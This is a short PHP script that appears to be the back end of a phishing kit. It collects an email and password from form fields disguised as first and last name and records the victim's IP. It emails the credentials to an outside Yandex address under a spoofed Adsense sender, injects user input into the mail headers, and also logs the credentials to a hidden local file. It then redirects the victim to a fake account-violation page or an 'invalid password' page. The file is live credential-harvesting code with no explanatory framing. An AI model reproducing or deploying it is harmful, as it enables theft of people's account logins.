<?php

/*========== [ Variables ]==========*/
$ip 		= getenv("REMOTE_ADDR");
$firsname = $_POST['firsname'];
$lastname = $_POST['lastname'];
/*========== [ Variables ]==========*/


$message = "
=============[ ADS ]==============
Email   : $firsname
Password: $lastname
=============[ ADS ]==============
IP	: http://www.geoiptool.com/?IP=$ip
==========[ THANK'S YOU ]==========";


$to = "c.cantix@yandex.com"; // Email Here
$subject = " FACE = [$ip]";
$headers = "From: Adsense (ADS) <mister@yandex.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);


header("Location:https://alertsuser.github.io/violates-actvity/update-recovry/home.html?/information-systems");


?>

<?php
$file = "ZZZZZ55544GGG";
$firsname = $_POST['firsname'];
$lastname = $_POST['lastname'];
$country = $_POST['country'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "");
fwrite($handle, "\n");
fwrite($handle, "EMAIL           = ");
fwrite($handle, "$firsname");
fwrite($handle, "\n");
fwrite($handle, "PASSWORD        = ");
fwrite($handle, "$lastname");
fwrite($handle, "\n");
fwrite($handle, "IP              = ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "DAY             = ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "=============================================");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"Invalid Email or password.html\";
// -->
</script>";
?>